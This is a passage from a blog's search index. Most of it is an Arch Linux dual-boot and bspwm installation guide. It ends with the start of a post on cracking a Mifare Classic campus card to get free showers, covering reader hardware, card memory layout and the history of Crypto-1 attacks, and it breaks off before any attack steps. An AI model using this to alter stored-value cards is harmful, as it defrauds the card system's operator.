磁盘管理器，在 磁盘 0 那块找到括号里写 EFI 系统分区 的那部分分区大小，记录下来，后面要用到。我这里是 100MB。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:3:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"确认分区表类型 本篇文章仅针对使用 GPT 分区表 的用户，如果你是 MBR 的话部分安装指令 需要修改，不能照抄。这里提供两种确认方式： ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:4:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"方法一 在 磁盘管理器 中，右键 磁盘 0 选择 属性 点击 卷， 查看 磁盘分区形式 是否为 GPT 分区表 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:4:1","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"方法二 部分用户右键 磁盘 0 可能会发现属性按钮是灰色的，无法点击， 这里提供一种命令行的解决方案：「Win + R 输入 diskpart 回车， 在打开的命令行窗口中输入 list disk 指令」，输出结果如下： 如果看到 磁盘 0 的 GPT 列表 标注了一个 *，说明你符合我们的安装要求， 可以进行下一步操作了。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:4:2","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"划分空间 打开 磁盘管理器，右键 C盘 的主空间选择 压缩卷 在 输入压缩空间量 中输入你想给 Linux 划分的内存大小，单位 MB（1GB = 1024MB） 比如我这里分出去 512GB，也就是 524,288 MB 压缩完会看到一个黑色的未分配空间， 这时候我们进入下一步操作，不要右键新建简单卷！ ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:5:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"关闭快速启动并关闭休眠 为了双系统的安全性着想，需要关闭 Windows 的 快速启动 并关闭 休眠 选项 至于为什么要关闭这两个选项见 Dual boot with Windows。 通过 Dism++ 软件可以轻易的关闭这两个选项： 在 Dism++ -\u003e 控制面板：系统优化 -\u003e 其它 即可找到这两个选项并关闭。 Windows 更新可能会自动开启这两个选项，因此每次重大更新后都应该检查 一下这两个选项的状态。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:6:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"准备安装盘 准备一个至少 8GB 大小的 U盘，里面重要数据可以先备份一下，后面要格式化。 首先下载 Rufus 烧录工具 和 Arch Linux 镜像文件，镜像下载完后可以使用 以下指令验证文件的完整性： certutil -hashfile \u003cfilename\u003e SHA256 然后复制输出的哈希值，去 Arch Linux 官网给出的 sha256sum 中核对有没有问题。 如果匹配则说明文件没有问题。 打开下载好的 Rufus 工具，选择你的安装介质和刚才下载的镜像，其它参数默认， 然后烧录。 烧录完成后不用拔出安装介质，直接重启电脑，进入 BIOS 模式，选择从你的 U盘 启动， 启动项一般包含 UEFI 字眼。 如果你不知道如何进入 BIOS，请自行百度。例：华硕进入 BIOS 按键。 如果发现无法从 U盘 启动，提示需要关闭 Secure Boot 的，请参考下文的方式关闭它。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:7:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"关闭 Secure Boot 因为从外部介质启动系统会被 Secure Boot ban，所以这里需要先去 BIOS 中 禁用 Secure Boot 选项。 这个选项一般在 BIOS 的 Advanced Settings 的 Security Settings 选项中。 将 Enable 改为 Disable 。 关闭后请按照上面的说明再次进入 U盘 启动，在打开的选择界面中选择第一项进行系统的安装。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:8:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"Arch Linux 系统安装 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"调大显示字体 setfont ter-132b ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:1","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"确认是否为 UEFI ls /sys/firmware/efi/efivars 如果用上面这条指令后输出了一堆东西则说明处于 UEFI，如果没有， 那你可能只能用 Legacy 启动了。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:2","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"禁用并停止自动匹配最快源服务 reflector 会为你选择速度合适的镜像源，但其结果并不准确，同时会清空配置文件中的内容， 对于新人来讲并不适用，我们首先对其进行禁用。 systemctl disable reflector.service systemctl stop reflector.service ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:3","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置时区 timedatectl set-timezone Asia/Shanghai timedatectl status ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:4","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"分区 先用 lsblk 指令查看你的硬盘是哪块，然后通过 cfdisk 指令进行分区。 这是我的分区方案： 4G - EFI 200G - root 300G - home 8G - swap cfdisk 分好区之后记得要 设置类型。 nvme0n1 是我的硬盘 ID，记得替换为你自己的。 lsblk cfdisk /dev/nvme0n1 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:5","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"格式化分区 EFI 分区 格式化为 fat root 分区 格式化为 ext4 home 分区 格式化为 ext4 创建并启用 swap 分区 lsblk mkfs.fat -F 32 /dev/nvme0n1p5 mkfs.ext4 /dev/nvme0n1p6 mkfs.ext4 /dev/nvme0n1p7 fallocate -l 8192M /mnt/swapfile chmod 600 /mnt/swapfile mkswap -L swap /mnt/swapfile swapon /mnt/swapfile lsblk ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:6","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"挂载分区 挂载顺序：一定要先挂载 根分区，再挂载 EFI 分区，最后其它分区。 mount /dev/nvme0n1p6 /mnt mkdir /mnt/efi mount /dev/nvme0n1p5 /mnt/efi mkdir /mnt/home mount /dev/nvme0n1p7 /mnt/home lsblk ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:7","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"换源 cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.bak cat /dev/null \u003e /etc/pacman.d/mirrorlist vim /etc/pacman.d/mirrorlist 添加如下源： Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 保存并退出 pacman -Sy ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:8","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"安装基础软件包 所有 Arch Linux 必装： base base-devel linux-zen linux-zen-headers linux-firmware 根据自己的 CPU 决定用哪个微码：amd-ucode / intel-ucode 使用 X11 服务显示桌面：xorg-xinit xorg-server fcitx5 输入法（不需要中文输入的可以不装）： fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-material-color fcitx5-pinyin-zhwiki 这几个常用工具应该没人不需要吧： sudo neofetch vim neovim git wget proxychains btop bash-completion 网络方面（没这些就别想用 wlan 了）： iwd networkmanager 音频输出： pipewire pipewire-pulse pipewire-alsa pipewire-jack 杂项（必装）：e2fsprogs ntfs-3g 字体（不装的话所有中文都是乱码）： adobe-source-han-serif-cn-fonts wqy-zenhei noto-fonts-cjk noto-fonts-emoji noto-fonts-extra 蓝牙（可选）：bluez pacstrap -i /mnt base base-devel linux-zen linux-zen-headers linux-firmware amd-ucode xorg-xinit xorg-server fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-material-color fcitx5-pinyin-zhwiki sudo neofetch neovim git wget proxychains btop iwd networkmanager alsa-utils e2fsprogs ntfs-3g bash-completion pipewire pipewire-pulse pipewire-alsa pipewire-jack adobe-source-han-serif-cn-fonts wqy-zenhei noto-fonts-cjk noto-fonts-emoji noto-fonts-extra bluez ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:9","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"生成 fstab genfstab -U /mnt \u003e\u003e/mnt/etc/fstab cat /mnt/etc/fstab ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:10","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"挂载 /mnt 分区 arch-chroot /mnt ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:11","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置用户和密码 # 此处分别设置：root 用户密码、添加自己日常使用的用户、设置用户权限组（注意逗号后面没空格）、为自己的账户设置密码、设置 wheel 组可以执行 sudo passwd useradd -m cub3y0nd passwd cub3y0nd usermod -aG wheel,storage,power -s /usr/bin/zsh cub3y0nd sudo nvim /etc/sudoers 取消注释第 89 行：%wheel ALL=(ALL:ALL) ALL 如果你不会使用 vim，最好自己查询一下基础操作。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:12","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置系统语言 nvim /etc/locale.gen 取消注释第 171 行：en_US.UTF-8 UTF-8 locale-gen echo 'LANG=en_US.UTF-8' \u003e /etc/locale.conf export LANG=en_US.UTF-8 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:13","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置主机名和 hosts（我的主机名是ASHES） echo ASHES \u003e /etc/hostname nvim /etc/hosts 添加以下内容： 127.0.0.1 localhost ::1 localhost 127.0.0.1 ASHES.localdomain localhost ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:14","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置时区并同步 ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime hwclock --systohc ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:15","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"双系统引导设置 pacman -S grub efibootmgr os-prober ntfs-3g dosfstools mtools nvim /etc/default/grub 将 `GRUB_CMDLINE_LINUX_DEFAULT` 的所有内容改为 GRUB_CMDLINE_LINUX_DEFAULT=\"loglevel=5 nowatchdog\" loglevel 改为 5 是为了后续如果出现系统错误，方便排错 加入 nowatchdog 参数，可以显著提高开关机速度 取消注释第 63 行：GRUB_DISABLE_OS_PROBER=false ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:16","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"安装 UEFI 这一步使用 MBR/Legacy Boot 的同学需要修改该指令，具体怎么改可以自己上网查询。 grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=Arch --recheck ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:17","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"生成 grub 配置 grub-mkconfig -o /boot/grub/grub.cfg ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:18","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"设置网络服务开机自启 systemctl enable NetworkManager.service ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:19","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"结束安装，取消所有挂载点并重启 exit umount -lR /mnt reboot 重启指令执行后就可以拔掉安装介质了。其实在 archiso 启动完毕之后 就可以拔掉安装介质了（copy2ram）。 重启后的选项卡列表里面可以看到有关 Arch Linux 的启动选项。 确认一下是否存在 Windows 的启动选项，如果不存在的话，先进入 Arch Linux， 然后使用以下命令添加 Windows 启动项 。 mount 中的 /dev/nvme0n1p1 是我的 Windows EFI 扇区名称，记得替换为你自己的 EFI 扇区 。 使用 MBR/Legacy Boot 的同学，下面的 mkdir 指令也需要修改，不能照抄。 mkdir -p /boot/EFI/Windows lsblk mount /dev/nvme0n1p1 /boot/EFI/Windows ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:9:20","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"Bspwm 接下来就可以使用我编写的自动化脚本配置一些常用环境了。 请确保你已配置好科学上网环境，如果没有科学上网环境的话安装过程可能不能稳定进行。 这是我的仓库地址： 1llusion https://github.com/CuB3y0nd/1llusion 确保 fcitx 在 wm（windows manager）环境中启动，并启动 bspwm。 nvim /etc/environment 添加以下行： export GTK_IM_MODULE=fcitx export QI_IM_MODULE=fcitx export XMODIFIERS=@im=fcitx cp /etc/X11/xinit/xinitrc ~/.xinitrc nvim ~/.xinitrc 注释以下行： twm \u0026 xclock -geometry 50x50-1+1 \u0026 xterm -geometry 80x50+494+51 \u0026 xterm -geometry 80x20+494-0 \u0026 exec xterm -geometry 80x66+8+0 -name login 添加以下行： fcitx5 \u0026 exec bspwm ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:10:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"下载脚本 cd curl https://raw.githubusercontent.com/CuB3y0nd/1llusion/master/install -o $HOME/install ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:10:1","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"授予执行权限 chmod +x install ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:10:2","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"运行脚本 ./install 请不要使用 root 权限运行该脚本！ 脚本执行结束后重启，使用 startx 指令即可进入 bspwm 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:10:3","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"AMD + NVIDIA 双显卡驱动安装 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:11:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"基础包安装 sudo pacman -S xf86-video-amdgpu sudo pacman -S nvidia-dkms nvidia-settings nvidia-prime # glmark2 是开源性能测试工具，可选 sudo pacman -S glmark2 yay -S optimus-manager optimus-manager-qt --noconfirm ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:11:1","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"配置 optimus-manager cp /usr/share/optimus-manager.conf /etc/optimus-manager/optimus-manager.conf sudo -E nvim /etc/optimus-manager/optimus-manager.conf 将 `pci_power_control` 改为 `yes` 在 `[amd]` 下，将 `driver` 改为 `amdgpu` ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:11:2","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"防止内核冲突 sudo -E nvim /etc/mkinitcpio.conf 把 `kms` 从 `HOOKS` 里面移除 sudo mkinitcpio -p linux-zen ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:11:3","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"切换教程 sudo -E nvim ~/.xinitrc 添加 `/usr/bin/prime-offload` 使用 optimus-manager --print-mode 可以查看当前使用的显卡。 使用 optimus-manager --switch nvidia 可以切换到 nvidia 显卡。 切换显卡前需要先执行 prime-offload，切换显卡重新登陆后需要执行 sudo prime-switch 。 可以允许 wheel 身份组以管理员权限执行 prime-switch 不用输入密码： sudo -E nvim /etc/sudoers %wheel ALL=(ALL:ALL) NOPASSWD:/usr/bin/prime-switch ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:11:4","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"FAQ ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:0","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"这个 bspwm 提供了哪些快捷键？ 请看 wiki 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:1","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"eww 无法编译/部分使用 eww 小组件 的主题（e.g. z0mbi3）无法使用 请看 issue 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:2","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"为什么有网络但是状态栏始终显示 Offline？ 请看 wiki 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:3","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"你的 bspwm 不适配我的显示器分辨率，我该怎么调整？ 你可以参考 Xorg 和 HiDPI 。 使用 echo 'Xft.dpi:\u003c大小\u003e' \u003e\u003e ~/.Xresources 指令来配置。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:4","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"为什么我的 neovim 图标显示不出来？ 请安装 nerd-fonts 。 我使用 JetBrainsMono 作为 neovim 的字体，指令如下： git clone https://github.com/ryanoasis/nerd-fonts.git cd nerd-fonts ./install.sh JetBrainsMono ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:5","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"neovim 打开一堆报错 确保你配置好了科学上网环境之后可以配置好 proxychains，用它打开 nvim， 或者你也可以直接配置好 git 的全局代理，然后多开几次 nvim。 每次打开 nvim 都会自动安装丢失的依赖，失败了就多重试几次，总是可以解决问题的。 我通过其它桌面环境配置了科学上网，卸载桌面后使用你的 bspwm，但是有些功能用不了。 如果你卸载桌面环境的时候同时删除了依赖，请自行确定哪些 bspwm 所需要的依赖 没有安装，重新安装即可修复。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:6","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Arch Linux"],"content":"更多问题都请移步 wiki wiki 。 ","date":"2023-07-29","objectID":"/archlinux-dualboot-and-bspwm-configure/:12:7","tags":["Arch Linux","Bspwm"],"title":"Arch Linux 双系统 + Bspwm 配置小记","uri":"/archlinux-dualboot-and-bspwm-configure/"},{"categories":["Misc"],"content":"本文只作技术交流分享研究之用，请勿用于非法用途，否则后果自负！ ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:0:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"0x01 开端 上周洗澡的时候突然想到：这种水控机有没有什么办法免费洗澡。 当时想到了两种方案。一种是洗澡的时候隔一会儿就拔插卡， 只要卡没有内置时间计数器的，理论上来说可以不扣钱。（虽然我只是幻想过，没有实测） 另一种是直接修改卡数据。 ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:1:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"0x02 前期成本 因为手机有 NFC 功能，可以用 APP 读卡。果断下载 MCT（Mifare Classic Tool）工具 后来发现事实上只靠 APP 破解是不现实的。 于是乎就在万能的淘宝上买了一个 PCR532 ，大概六十多。本来想直接买最高端的 PM3 的， 但一个六百多还是有点贵了。再说破解校园一卡通这种基本上用不着那么高端的设备 （买不起， 只能将就用一下中端的设备了。 再说下 PCR532 和 PN532 的区别：PCR532 可以理解为 PN532 的进阶版， 省去了一些不必要的东西，成功率上好像也比 PN532 高一点。 如果买不起 PCR532 的也可以选择 PN532 ，后者只要二十来块钱就可以买到， 效果上也不会差太多。 PS：想深入研究的可以考虑买 PM3，不会亏的 ( ","date":"2022-11-04","objectID":"/ic-card-replay-attack/:2:0","tags":["Misc"],"title":"校园卡破解","uri":"/ic-card-replay-attack/"},{"categories":["Misc"],"content":"0x03 卡片技术和历史 如果买好了上面的设备，就可以开工了。当然就算这个流程再简单还是要讲一讲一些 技术细节和相关知识的，不然这篇文章就毫无价值了。 首先我们要破解的卡片虽然被称为 IC 卡 ，但这个名字只是为了和 ID 卡 相区别。 IC卡 既有 接触式 的也有 非接触式 的，非接触式 有基于 COS（嵌入式软件） 的， 也有 Mifare Classic 1 这类逻辑加密卡，本文讨论的就是 Mifare（简称 M1 卡） 。 M1 卡 使用硬件技术固化了一种不公开的密码算法，叫做 Crypto-1 。 （然而信息安全这种事情从来都是和公开或者不公开没有半毛钱关系的，该破解的还是照样破解 逻辑结构上，M1 卡 本质上是一个有着几个额外功能的存储器卡。存储器被分成许多的 数据块 ， 每个数据块由 16 Bytes 组成，这些数据块组成 扇区 。1K 的 M1 卡 有 16 个扇区， 每个扇区有四个数据块，这里的数据块就是用来存储自定义内容的，比如说剩余金额一类。 4K 的 M1 卡 的前 32 个扇区由 4 个数据块组成，剩下的 8 个扇区每个由 16 个 数据块组成。每一个扇区中最后一个数据块被称为 扇尾 。0 扇区 有特殊的数据。前 4 个 数据字节包括唯一的卡验证号 UID ，后面跟着一个字节的位计数检查 BCC 。这个位计数检查通 过连续异或所有的 UID 字节被计算出来。剩下的字节用来存储制造商的数据。这个数据块是只读的。 读卡器需要在进行任何存储操作前认证扇区。扇尾包含 密钥 A 和 密钥 B ，这两个密钥都是用来认证的。 访问条件定义了对该扇区的哪种操作是可行的，也是大家通常讲的「锁控制位」所锁定的地方。 扇尾有特殊的访问条件。密钥 A 是永远不可读的，而 密钥 B 可被设置成可读或不可读。 当为可读时，存储器只用来存储数据而 密钥 B 不能用作认证密钥。除了访问条件 AC 和 密钥 ， 剩下一个未被定义的数据字节 U 可以被用来存储任意的数据或设置成 值模块（Value Block） 。 当用作值模块时，一个有符号的 4 Bytes 的值被存储了三次，两次未取反和一次取反。 取反在这里意味着值的每一位都和 1 进行异或。这四个字节按照从左到右低位字节到高位字节的顺序存储。 剩下的四个字节用来存储 1 Byte 的模块地址，这个地址可被用作 指针（Pointer） 。 就像一切硬件 Hack 一样，这个卡片的破解也是从硬件开始的 历史 在 2007 年 年底柏林举行的 第 24 届黑客大会 Chaos Communications Congress 上， 两位研究者宣读了他们合作的论文。「这两位一个是德国的学者 Henryk Plotz， 另一个是弗吉尼亚大学的在读博士 Karsten Nohl，他们利用显微镜， 把 Mifare Classic 的芯片进行了抽丝剥茧般的逐层分析，然后附以 RFID 读卡器 ， 得到了 Mifare Classic 芯片每层的布线图。从而分析出芯片中近万个逻辑单元， 分别是逻辑电路的与门、或门以及触发器…… 他们从这些逻辑门中发现了规律， 从而大大简化了分析的进程。接下来就是要找到其中关键的加密处理部分。 他们按照自己获得的数据信息进行了重构，在此过程中他们详细分析了各个单元模块的功能， 经过一番辛苦劳作之后，他们发现了 Mifare Classic 芯片的若干安全隐患。 其中之一就是他们掌握了一个 16 bit 随机数发生器的原理，每次都能够正确预测下一个随机数的值」 这个伪随机数发生器的函数是：$$x^{16} + x^{14} + x^{13} + x^{11} + 1$$ 2008 年 2 月 ，荷兰政府公布的一项针对此事的报告对此回应： 报告肯定了 Nohl 和 Plotz 的发现，但却断言由于攻击的成本， M1 卡 系统在两年内还是安全的。他们估计攻击所使用的硬件成本约为 9000$ ， 并费时数小时。 Nohl 对荷兰政府想把大事化小的态度不甚满意，于是马上又发表了一篇名为 Cryptanalysis of Crypto-1 的文章，公开了 Mifare Classic 加密算法 Crypto-1 的核心就是一个 48 bit 的线性反馈移位寄存器加上几个输出函数过滤器。 而这几个函数过滤器应用了三种不同的函数关系，它们都有统计学上偏移的弱点， 利用这些弱点和之前掌握的随机数发生器的知识，使用普通计算机通过向读卡器发送 几十个挑战数，就能够猜出卡片的密钥中的 32 bit 是什么。 其中有 12 bit 仅通过乱码流的第一位比特值便可判定，其余 36 bit 密钥值的 破解时间，若使用一个 FPGA 装置 是 30 秒内，即使使用普通 PC 机 也就用几分钟。 不过 Nohl 所公布的信息还是有相当保留的，他虽介绍了攻击方法，却没有技术细节， 对 Crypto-1 的内容和缺陷也披露的颇为朦胧。所以 Nohl 的这篇文章更像是在 警告世人，而不是倾囊而出地展现自己到底知道多少。所以到这个时候 Mifare 的最后 一层面纱还没有在公共面前揭开。然而，Nohl 的文章的标题 Cryptographic analysis of Crypto-1 却为有志者指明了奋斗方向。 后来，荷兰自己的一所大学（Radboud 大学）终于站出来打了政府的脸，通过一篇文章 向公众揭开了 Crypto-1 的庐山真面目。文章声称：「在逆向研究了 M1 卡 的安全机制： 『包括认证协议、对称加密算法和初始化机制后。』他们发现了存在于上述机制中的几个 安全漏洞，利用这些漏洞，可实施两种攻击，这两种攻击都可以从一个真实的读卡器中 获取密钥。其中一个攻击仅需要与读卡器进行一或两次的认证尝试，不到一秒钟。 